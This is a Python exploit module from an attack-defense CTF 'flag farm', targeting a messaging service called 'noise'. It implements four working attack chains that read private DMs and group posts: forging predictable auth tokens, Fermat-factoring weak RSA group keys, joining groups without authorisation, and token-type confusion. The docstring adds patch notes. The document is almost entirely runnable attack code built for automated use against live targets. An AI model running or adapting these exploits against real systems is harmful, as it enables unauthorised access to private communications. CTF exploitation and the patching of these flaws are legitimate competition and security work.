#!/usr/bin/env python3
"""noise (6426/tcp) — flag farm module. Four independent chains.

Audit: /home/kali/adctf/cubectf/audit/noise.md
Source: /home/kali/adctf/cubectf/services/services/noise

The secrets live in two SQLite TEXT columns: `dm.message` (private DMs) and
`gmsg.message` (private group posts). There is no flag file. Every vector here
returns those plaintexts; the farm applies the flag regex.

Vectors, cheapest/most reliable first:

  1. v_token_forge      — audit chain A + variant A'.
     `service.py:46 make_token()` is sha256("noise-token-{kind}-{id}")[:16]:
     no secret, no randomness. `get_token_subject` only checks membership in the
     in-memory `auth_cache`, and the *unauthenticated* CHALLENGE (op 3) /
     GROUP_CHALLENGE (op 7) insert the token into that dict before any proof of
     key possession. LIST_USERS (op 2) and LIST_ALL_GROUPS (op 12) publish every
     id and pubkey anonymously, so: enumerate -> prime -> forge -> read.
     Needs no account. Recovers both DMs and group posts.
     PATCH: `make_token` returns `f"{kind}:{id}:{secrets.token_hex(8)}"`.

  2. v_fermat           — audit chain C.
     `crypto.py:36 generate_group_keypair` picks q = randprime(...) and
     p = nextprime(q + randbelow(1<<20) + 2), so |p-q| < 2^20 and Fermat's
     method converges in 0 iterations on a 2048-bit modulus. Group public keys
     are exactly what op 12 hands out anonymously. Factor -> rebuild d ->
     genuinely OAEP-decrypt the GROUP_CHALLENGE -> group token -> op 11.
     Needs no account, writes nothing to the DB, stealthiest. Group posts only.
     PATCH: `generate_group_keypair` -> `rsa.generate_private_key(...)`.
     (Does not retroactively fix groups created before the patch.)

  3. v_invite           — audit chain B.
     `service.py:127 invite()` never asks whether the caller has anything to do
     with `gid` (contrast `send_group`, which calls `is_member`). Self-join any
     group, then LIST_GROUPS (op 9) hands every member the group's `priv` by
     design -> OAEP-decrypt the group challenge -> op 11. Needs a throwaway
     account and uses no token forgery, so it survives a `make_token` fix. Noisy:
     leaves a `group_members` row naming us. Group posts only.
     PATCH: `if not self.db.is_member(gid, caller.id): raise NotAuthorizedError`.

  4. v_token_confusion  — audit chain D, a widener.
     `service.py:51 get_token_subject` ignores its `assert_type` argument, so a
     group token works on user ops and vice versa, with the id reinterpreted in
     the other namespace. Fermat-derived group token -> GET_MESSAGES (op 5) reads
     the DMs of the *user* whose uid equals that gid — i.e. DMs with no account
     and no token forgery, which neither chain B nor C reaches on its own. Also
     forged user token -> GROUP_MESSAGES (op 11) -> posts of group gid == uid,
     and group token -> LIST_GROUPS -> that user's groups' private keys.
     PATCH: `if not isinstance(subject, assert_type): raise InvalidTokenError`.

A closed port or a peer speaking a different protocol is remembered for
DEAD_TTL seconds so only the first vector of a sweep pays the connect timeout;
a live-but-patched service (any protocol-level error frame) is not memoised, so
the other vectors still get their turn.

Pure stdlib: the binary framing is `struct`, the DER codec is hand-rolled, and
the RSA/Fermat/OAEP maths is `pow` + `math.isqrt` + `hashlib`. Nothing here
imports cryptography, pycryptodome or gmpy2, so it also runs on the vulnbox.
"""

from __future__ import annotations

import base64
import binascii
import hashlib
import math
import random
import socket
import struct
import time

from _common import DEFAULT_TIMEOUT, dedup, main, rand_name, run_vectors, safe

NAME = "noise"
PORT = 6426

# --- sweep caps: one target, sequential, polite. ---------------------------
#: Most users / groups walked per vector. Bounds both wall-clock and the number
#: of `auth_cache` entries we create (the cache is unbounded server-side, and a
#: deterministic token means one entry per subject, so these are hard bounds).
MAX_USERS = 32
MAX_GROUPS = 32
#: Wall-clock budget for a whole vector = timeout * this. Loops stop when it is
#: spent and return whatever they already recovered.
BUDGET_FACTOR = 2.5
#: How long a target that failed at the transport/framing level is skipped for.
#: Long enough that the remaining vectors in one sweep do not each re-pay the
#: connect timeout, short enough that the next farm tick retries it.
DEAD_TTL = 10.0
#: Fermat should land in 0 iterations per the audit; this is only a guard.
FERMAT_MAX_ITERS = 20000
#: Our throwaway identity's modulus size. 1024 bits keeps pure-Python prime
#: generation to ~0.1s; the server only calls load_der_public_key on it.
OWN_KEY_BITS = 1024


# =========================================================================
# wire protocol (binproto.py) — struct only
# =========================================================================

MAGIC = b"NOIZ"
VERSION = 1
F_REQUEST = 0
F_OK = 1
F_ERROR = 2
MAX_FRAME = 1 << 20

_HEADER = struct.Struct("!4sBBBI")

OP_REGISTER = 1
OP_LIST_USERS = 2
OP_CHALLENGE = 3
OP_SEND_DM = 4
OP_GET_MESSAGES = 5
OP_CREATE_GROUP = 6
OP_GROUP_CHALLENGE = 7
OP_INVITE = 8
OP_LIST_GROUPS = 9
OP_SEND_GROUP = 10
OP_GROUP_MESSAGES = 11
OP_LIST_ALL_GROUPS = 12


class NoiseWireError(Exception):
    """Service answered with an F_ERROR frame (status, message)."""

    def __init__(self, status: int, message: str) -> None:
        super().__init__(f"{status}: {message}")
        self.status = status
        self.message = message


class NotNoise(Exception):
    """Peer is not speaking this protocol (wrong service, or patched framing)."""


def p_str(value: str) -> bytes:
    body = value.encode("utf-8")
    return struct.pack("!I", len(body)) + body


def p_u32(value: int) -> bytes:
    return struct.pack("!I", value & 0xFFFFFFFF)


class Reader:
    """Bounds-checked payload reader. Raises on truncation, never over-reads."""

    def __init__(self, data: bytes) -> None:
        self.data = data
        self.i = 0

    def take(self, n: int) -> bytes:
        if n < 0 or self.i + n > len(self.data):
            raise NotNoise("payload truncated")
        chunk = self.data[self.i:self.i + n]
        self.i += n
        return chunk

    def u32(self) -> int:
        return struct.unpack("!I", self.take(4))[0]

    def u16(self) -> int:
        return struct.unpack("!H", self.take(2))[0]

    def raw(self) -> bytes:
        return self.take(self.u32())

    def text(self) -> str:
        return self.raw().decode("utf-8", "replace")

    def count(self, cap: int) -> int:
        """A list length, sanity-capped against the remaining payload."""
        n = self.u32()
        if n > cap or n > len(self.data) - self.i:
            raise NotNoise(f"implausible list length {n}")
        return n


class Noise:
    """One connection, with a hard wall-clock budget on every read.

    `binproto.recv_frame` checks `payload_len` against MAX_FRAME before reading,
    so the server will not over-allocate — but we do not trust the peer to be
    the server, so we bound every frame read ourselves as well.
    """

    def __init__(self, host: str, port: int, timeout: float = DEFAULT_TIMEOUT,
                 budget: float | None = None) -> None:
        self.timeout = timeout
        self.deadline = time.monotonic() + (budget if budget else timeout)
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout)

    def __enter__(self) -> "Noise":
        return self

    def __exit__(self, *exc) -> None:
        self.close()

    def close(self) -> None:
        try:
            self.sock.close()
        except OSError:
            pass

    @property
    def left(self) -> float:
        return self.deadline - time.monotonic()

    def expired(self) -> bool:
        return self.left <= 0

    def _recv_exact(self, n: int) -> bytes:
        if n > MAX_FRAME + _HEADER.size:
            raise NotNoise(f"frame too large: {n}")
        chunks: list[bytes] = []
        got = 0
        while got < n:
            left = self.left
            if left <= 0:
                raise TimeoutError("budget exhausted")
            self.sock.settimeout(min(left, self.timeout))
            chunk = self.sock.recv(min(n - got, 65536))
            if not chunk:
                raise ConnectionError("peer closed connection")
            chunks.append(chunk)
            got += len(chunk)
        return b"".join(chunks)

    def call(self, opcode: int, payload: bytes = b"") -> bytes:
        """Send one request frame, return the OK payload. Raises on error."""
        if self.expired():
            raise TimeoutError("budget exhausted")
        self.sock.sendall(_HEADER.pack(MAGIC, VERSION, F_REQUEST, opcode, len(payload)) + payload)
        magic, version, flags, op, length = _HEADER.unpack(self._recv_exact(_HEADER.size))
        if magic != MAGIC or version != VERSION:
            raise NotNoise(f"bad header {magic!r} v{version}")
        if length > MAX_FRAME:
            raise NotNoise(f"frame too large: {length}")
        body = self._recv_exact(length) if length else b""
        if flags == F_ERROR:
            reader = Reader(body)
            try:
                raise NoiseWireError(reader.u16(), reader.text())
            except NotNoise:
                raise NoiseWireError(0, "malformed error frame")
        if flags != F_OK:
            raise NotNoise(f"unexpected flags {flags}")
        return body

    # --- typed ops -------------------------------------------------------

    def list_users(self) -> list[tuple[int, str, str]]:
        r = Reader(self.call(OP_LIST_USERS))
        return [(r.u32(), r.text(), r.text()) for _ in range(r.count(1 << 16))]

    def list_all_groups(self) -> list[tuple[int, str, str, int]]:
        r = Reader(self.call(OP_LIST_ALL_GROUPS))
        return [(r.u32(), r.text(), r.text(), r.u32()) for _ in range(r.count(1 << 16))]

    def challenge(self, pubkey: str) -> str:
        return Reader(self.call(OP_CHALLENGE, p_str(pubkey))).text()

    def group_challenge(self, pubkey: str) -> str:
        return Reader(self.call(OP_GROUP_CHALLENGE, p_str(pubkey))).text()

    def register(self, pubkey: str, name: str) -> tuple[int, str, str]:
        r = Reader(self.call(OP_REGISTER, p_str(pubkey) + p_str(name)))
        return r.u32(), r.text(), r.text()

    def get_messages(self, token: str) -> list[tuple[int, str, str, str]]:
        r = Reader(self.call(OP_GET_MESSAGES, p_str(token)))
        return [(r.u32(), r.text(), r.text(), r.text()) for _ in range(r.count(1 << 16))]

    def group_messages(self, group_token: str) -> list[tuple[int, str, str, str]]:
        r = Reader(self.call(OP_GROUP_MESSAGES, p_str(group_token)))
        return [(r.u32(), r.text(), r.text(), r.text()) for _ in range(r.count(1 << 16))]

    def list_groups(self, token: str) -> list[tuple[int, str, str, str]]:
        """GroupSecret list — includes `privkey` for every group we belong to."""
        r = Reader(self.call(OP_LIST_GROUPS, p_str(token)))
        return [(r.u32(), r.text(), r.text(), r.text()) for _ in range(r.count(1 << 16))]

    def invite(self, token: str, gid: int, uid: int) -> None:
        self.call(OP_INVITE, p_str(token) + p_u32(gid) + p_u32(uid))


# =========================================================================
# tokens (service.py:46)
# =========================================================================


def forge_token(kind: str, subject_id: int) -> str:
    digest = hashlib.sha256(f"noise-token-{kind}-{subject_id}".encode()).hexdigest()[:16]
    return f"{kind}:{subject_id}:{digest}"


# =========================================================================
# minimal DER + RSA + OAEP, pure stdlib
# =========================================================================

#: AlgorithmIdentifier for rsaEncryption (1.2.840.113549.1.1.1) + NULL params.
_RSA_ALGID = bytes.fromhex("300d06092a864886f70d0101010500")


def b64u_decode(text: str) -> bytes:
    data = text.strip().encode("ascii", "ignore")
    return base64.urlsafe_b64decode(data + b"=" * (-len(data) % 4))


def _der_tlv(data: bytes, i: int) -> tuple[int, bytes, int]:
    """Return (tag, content, next_index) for one DER element."""
    if i + 2 > len(data):
        raise ValueError("der truncated")
    tag = data[i]
    length = data[i + 1]
    i += 2
    if length & 0x80:
        nbytes = length & 0x7F
        if nbytes == 0 or nbytes > 4 or i + nbytes > len(data):
            raise ValueError("der bad length")
        length = int.from_bytes(data[i:i + nbytes], "big")
        i += nbytes
    if i + length > len(data):
        raise ValueError("der content truncated")
    return tag, data[i:i + length], i + length


def _der_seq(content: bytes) -> list[tuple[int, bytes]]:
    out: list[tuple[int, bytes]] = []
    i = 0
    while i < len(content):
        tag, body, i = _der_tlv(content, i)
        out.append((tag, body))
    return out


def _der_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    body = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(body)]) + body


def _der_wrap(tag: int, body: bytes) -> bytes:
    return bytes([tag]) + _der_len(len(body)) + body


def _der_int(value: int) -> bytes:
    # (bit_length + 8) // 8 adds the leading zero byte DER needs for positives.
    width = (value.bit_length() + 8) // 8 or 1
    return _der_wrap(0x02, value.to_bytes(width, "big"))


def parse_spki_pubkey(pub_b64: str) -> tuple[int, int]:
    """urlsafe-b64 SPKI DER -> (n, e). Matches crypto.pubkey_to_base64."""
    tag, outer, _ = _der_tlv(b64u_decode(pub_b64), 0)
    if tag != 0x30:
        raise ValueError("spki: not a sequence")
    items = _der_seq(outer)
    bitstring = next(body for t, body in items if t == 0x03)
    if not bitstring or bitstring[0] != 0:
        raise ValueError("spki: unused bits")
    tag, rsapub, _ = _der_tlv(bitstring[1:], 0)
    if tag != 0x30:
        raise ValueError("spki: not an RSAPublicKey")
    nums = [int.from_bytes(body, "big") for t, body in _der_seq(rsapub) if t == 0x02]
    if len(nums) < 2:
        raise ValueError("spki: missing n/e")
    return nums[0], nums[1]


def parse_pkcs8_privkey(priv_b64: str) -> tuple[int, int]:
    """urlsafe-b64 PKCS8 DER -> (n, d). Matches crypto.privkey_to_base64."""
    tag, outer, _ = _der_tlv(b64u_decode(priv_b64), 0)
    if tag != 0x30:
        raise ValueError("pkcs8: not a sequence")
    octets = next(body for t, body in _der_seq(outer) if t == 0x04)
    tag, rsapriv, _ = _der_tlv(octets, 0)
    if tag != 0x30:
        raise ValueError("pkcs8: not an RSAPrivateKey")
    nums = [int.from_bytes(body, "big") for t, body in _der_seq(rsapriv) if t == 0x02]
    if len(nums) < 4:
        raise ValueError("pkcs8: short RSAPrivateKey")
    return nums[1], nums[3]  # version, n, e, d, ...


def spki_from_numbers(n: int, e: int) -> str:
    rsapub = _der_wrap(0x30, _der_int(n) + _der_int(e))
    spki = _der_wrap(0x30, _RSA_ALGID + _der_wrap(0x03, b"\x00" + rsapub))
    return base64.urlsafe_b64encode(spki).decode()


def _mgf1(seed: bytes, length: int) -> bytes:
    out = b""
    counter = 0
    while len(out) < length:
        out += hashlib.sha256(seed + struct.pack("!I", counter)).digest()
        counter += 1
    return out[:length]


def oaep_decrypt(n: int, d: int, ciphertext: bytes) -> bytes:
    """RSAES-OAEP with SHA-256 / MGF1-SHA256 / empty label (crypto.py:_OAEP)."""
    k = (n.bit_length() + 7) // 8
    hlen = 32
    if len(ciphertext) != k or k < 2 * hlen + 2:
        raise ValueError("oaep: wrong ciphertext length")
    em = pow(int.from_bytes(ciphertext, "big"), d, n).to_bytes(k, "big")
    if em[0] != 0:
        raise ValueError("oaep: nonzero leading byte")
    masked_seed, masked_db = em[1:1 + hlen], em[1 + hlen:]
    seed = bytes(a ^ b for a, b in zip(masked_seed, _mgf1(masked_db, hlen)))
    db = bytes(a ^ b for a, b in zip(masked_db, _mgf1(seed, len(masked_db))))
    if db[:hlen] != hashlib.sha256(b"").digest():
        raise ValueError("oaep: label hash mismatch")
    sep = db.find(b"\x01", hlen)
    if sep < 0 or any(db[hlen:sep]):
        raise ValueError("oaep: bad padding")
    return db[sep + 1:]


def oaep_decrypt_b64(n: int, d: int, ciphertext_b64: str) -> bytes:
    return oaep_decrypt(n, d, b64u_decode(ciphertext_b64))


def fermat_factor(n: int, max_iters: int = FERMAT_MAX_ITERS,
                  budget: float = 2.0) -> tuple[int, int] | None:
    """Fermat's method. Converges in 0 iterations when |p-q| < 2^20 (chain C)."""
    if n <= 1 or n % 2 == 0:
        return None
    a = math.isqrt(n)
    if a * a < n:
        a += 1
    stop = time.monotonic() + budget
    for i in range(max_iters):
        b2 = a * a - n
        b = math.isqrt(b2)
        if b * b == b2:
            p, q = a - b, a + b
            if p > 1 and p * q == n:
                return p, q
        a += 1
        if (i & 0x3FF) == 0x3FF and time.monotonic() > stop:
            return None
    return None


def privkey_from_pubkey_fermat(pub_b64: str) -> tuple[int, int] | None:
    """Group pubkey -> (n, d) by Fermat factorisation. None if it is a sane key."""
    try:
        n, e = parse_spki_pubkey(pub_b64)
    except (ValueError, StopIteration, binascii.Error):
        return None
    factors = fermat_factor(n)
    if not factors:
        return None
    p, q = factors
    try:
        return n, pow(e, -1, (p - 1) * (q - 1))
    except ValueError:
        return None


# --- our own throwaway keypair (chain B needs a real account) --------------

_SMALL_PRIMES = [
    2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71,
    73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151,
    157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233,
    239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317,
]


def _is_probable_prime(n: int, rounds: int = 16) -> bool:
    for p in _SMALL_PRIMES:
        if n % p == 0:
            return n == p
    d, r = n - 1, 0
    while d % 2 == 0:
        d //= 2
        r += 1
    for _ in range(rounds):
        x = pow(random.randrange(2, n - 1), d, n)
        if x == 1 or x == n - 1:
            continue
        for _ in range(r - 1):
            x = x * x % n
            if x == n - 1:
                break
        else:
            return False
    return True


def _gen_prime(bits: int) -> int:
    while True:
        candidate = random.getrandbits(bits) | (3 << (bits - 2)) | 1
        if _is_probable_prime(candidate):
            return candidate


def gen_keypair(bits: int = OWN_KEY_BITS) -> tuple[int, int, str]:
    """Fresh RSA identity per call -> (n, d, spki_b64). Pure `random` + `pow`."""
    e = 65537
    while True:
        p = _gen_prime(bits // 2)
        q = _gen_prime(bits - bits // 2)
        if p == q:
            continue
        phi = (p - 1) * (q - 1)
        if math.gcd(e, phi) != 1:
            continue
        return p * q, pow(e, -1, phi), spki_from_numbers(p * q, e)


# =========================================================================
# shared helpers
# =========================================================================

#: Targets that failed at the transport/framing level, with an expiry. Without
#: this, a closed port or a service speaking something else costs one connect
#: timeout *per vector*; with it, only the first vector pays.
_DEAD: dict[tuple[str, int], float] = {}


def _mark_dead(host: str, port: int) -> None:
    now = time.monotonic()
    for key, until in list(_DEAD.items()):
        if until <= now:
            _DEAD.pop(key, None)
    if len(_DEAD) > 256:
        _DEAD.clear()
    _DEAD[(host, port)] = now + DEAD_TTL


def _is_dead(host: str, port: int) -> bool:
    until = _DEAD.get((host, port))
    if until is None:
        return False
    if time.monotonic() > until:
        _DEAD.pop((host, port), None)
        return False
    return True


def _open(host: str, port: int, timeout: float) -> Noise:
    if _is_dead(host, port):
        raise ConnectionError(f"{host}:{port} marked unreachable, skipping")
    try:
        return Noise(host, port, timeout, budget=timeout * BUDGET_FACTOR)
    except OSError:
        _mark_dead(host, port)
        raise


def _probe(host: str, port: int, fn, *args):
    """First op on a connection: a failure here means the peer is not noise.

    A `NoiseWireError` is deliberately *not* caught — that is a live noise
    service refusing us (patched), which the other vectors should still try.
    """
    try:
        return fn(*args)
    except (NotNoise, TimeoutError, OSError, struct.error):
        _mark_dead(host, port)
        raise



def _texts(messages) -> list[str]:
    """Message plaintexts out of a (src_id, src_name, time, message) list."""
    return [m[3] for m in messages if m[3]]


def _try(fn, *args):
    """Call one op, swallowing a per-subject failure so the loop continues."""
    try:
        return fn(*args)
    except (NoiseWireError, ValueError, StopIteration, UnicodeError,
            binascii.Error):
        return None


def _group_token_via_priv(conn: Noise, pubkey: str, priv_b64: str) -> str | None:
    """Honest auth: decrypt the group's own challenge with its private key."""
    try:
        n, d = parse_pkcs8_privkey(priv_b64)
    except (ValueError, StopIteration, binascii.Error):
        return None
    challenge = _try(conn.group_challenge, pubkey)
    if challenge is None:
        return None
    try:
        return oaep_decrypt_b64(n, d, challenge).decode("utf-8", "replace")
    except (ValueError, binascii.Error):
        return None


# =========================================================================
# vectors
# =========================================================================


@safe
def v_token_forge(host: str, port: int, timeout: float = DEFAULT_TIMEOUT) -> list[str]:
    """Chain A + A': predictable make_token + unauthenticated challenge priming.

    No account. Enumerates every user and group from the service itself, primes
    each subject's deterministic token with the unauthenticated CHALLENGE /
    GROUP_CHALLENGE, then reads DMs (op 5) and group posts (op 11) outright.
    """
    found: list[str] = []
    with _open(host, port, timeout) as conn:
        groups = _probe(host, port, conn.list_all_groups)[:MAX_GROUPS]
        users = conn.list_users()[:MAX_USERS]

        # A': groups first — one op 7 + one op 11 each, no user involved.
        for gid, _name, pubkey, _owner in groups:
            if conn.expired():
                break
            _try(conn.group_challenge, pubkey)          # prime auth_cache
            messages = _try(conn.group_messages, forge_token("group", gid))
            if messages:
                found.extend(_texts(messages))

        # A: users — DMs addressed to each victim.
        for uid, _name, pubkey in users:
            if conn.expired():
                break
            _try(conn.challenge, pubkey)                # prime auth_cache
            messages = _try(conn.get_messages, forge_token("user", uid))
            if messages:
                found.extend(_texts(messages))
    return dedup(found)


@safe
def v_fermat(host: str, port: int, timeout: float = DEFAULT_TIMEOUT) -> list[str]:
    """Chain C: Fermat-factor the group RSA keys (|p-q| < 2^20) from op 12.

    No account, no DB writes, no token forgery — we recover the group's real
    private exponent and genuinely OAEP-decrypt its own challenge. Survives a
    fix to both `make_token` and `invite`.
    """
    found: list[str] = []
    with _open(host, port, timeout) as conn:
        for _gid, _name, pubkey, _owner in _probe(host, port, conn.list_all_groups)[:MAX_GROUPS]:
            if conn.expired():
                break
            keypair = privkey_from_pubkey_fermat(pubkey)
            if keypair is None:
                continue                                 # key was regenerated safely
            n, d = keypair
            challenge = _try(conn.group_challenge, pubkey)
            if challenge is None:
                continue
            try:
                token = oaep_decrypt_b64(n, d, challenge).decode("utf-8", "replace")
            except (ValueError, binascii.Error):
                continue
            messages = _try(conn.group_messages, token)
            if messages:
                found.extend(_texts(messages))
    return dedup(found)


@safe
def v_invite(host: str, port: int, timeout: float = DEFAULT_TIMEOUT) -> list[str]:
    """Chain B: `invite` has no membership check, and members are handed `priv`.

    Registers a fresh throwaway identity, self-joins every published group, then
    LIST_GROUPS (op 9) returns each group's private key by design. Uses no token
    forgery at all, so it survives a `make_token` fix. Noisy: leaves one
    `group_members` row per group naming our uid.
    """
    found: list[str] = []
    n, d, pub_b64 = gen_keypair()
    with _open(host, port, timeout) as conn:
        groups = _probe(host, port, conn.list_all_groups)[:MAX_GROUPS]
        uid, _name, _pub = conn.register(pub_b64, rand_name())
        token = oaep_decrypt_b64(n, d, conn.challenge(pub_b64)).decode("utf-8", "replace")

        for gid, _gname, _gpub, _owner in groups:
            if conn.expired():
                break
            _try(conn.invite, token, gid, uid)           # "already a member" -> 403, fine

        for _gid, _gname, gpub, gpriv in conn.list_groups(token)[:MAX_GROUPS]:
            if conn.expired():
                break
            group_token = _group_token_via_priv(conn, gpub, gpriv)
            if not group_token:
                continue
            messages = _try(conn.group_messages, group_token)
            if messages:
                found.extend(_texts(messages))

        # Anything already addressed to us (normally nothing; free to check).
        own = _try(conn.get_messages, token)
        if own:
            found.extend(_texts(own))
    return dedup(found)


@safe
def v_token_confusion(host: str, port: int, timeout: float = DEFAULT_TIMEOUT) -> list[str]:
    """Chain D: `get_token_subject` ignores `assert_type` — cross-namespace reads.

    The valuable half needs no account and no forgery: a Fermat-derived *group*
    token presented to GET_MESSAGES (op 5) reads `db.get_dms(gid)`, i.e. the DMs
    of the user whose uid happens to equal that gid. The other half uses a forged
    *user* token on GROUP_MESSAGES (op 11) to read `db.get_gmsg(uid)`.
    """
    found: list[str] = []
    with _open(host, port, timeout) as conn:
        groups = _probe(host, port, conn.list_all_groups)[:MAX_GROUPS]
        users = conn.list_users()[:MAX_USERS]

        for gid, _name, pubkey, _owner in groups:
            if conn.expired():
                break
            # Prefer an honestly recovered group token (survives a token fix),
            # fall back to the forged one.
            token = None
            keypair = privkey_from_pubkey_fermat(pubkey)
            challenge = _try(conn.group_challenge, pubkey)
            if keypair and challenge:
                try:
                    token = oaep_decrypt_b64(*keypair, challenge).decode("utf-8", "replace")
                except (ValueError, binascii.Error):
                    token = None
            if token is None:
                token = forge_token("group", gid)        # challenge above primed it

            # group token -> user op: DMs of uid == gid
            dms = _try(conn.get_messages, token)
            if dms:
                found.extend(_texts(dms))
            # group token -> LIST_GROUPS: get_user_groups(uid == gid), with privkeys
            for _g2, _n2, gpub2, gpriv2 in (_try(conn.list_groups, token) or [])[:MAX_GROUPS]:
                if conn.expired():
                    break
                group_token = _group_token_via_priv(conn, gpub2, gpriv2)
                messages = _try(conn.group_messages, group_token) if group_token else None
                if messages:
                    found.extend(_texts(messages))

        for uid, _name, pubkey in users:
            if conn.expired():
                break
            _try(conn.challenge, pubkey)                 # prime the user token
            # user token -> group op: posts of gid == uid
            messages = _try(conn.group_messages, forge_token("user", uid))
            if messages:
                found.extend(_texts(messages))
    return dedup(found)


VECTORS = [v_token_forge, v_fermat, v_invite, v_token_confusion]


def run(host: str, port: int = PORT, timeout: float = 8.0) -> list[str]:
    """Return every recovered secret string. MUST NOT raise."""
    return run_vectors(VECTORS, host, port, timeout)


if __name__ == "__main__":
    raise SystemExit(main(run, PORT))
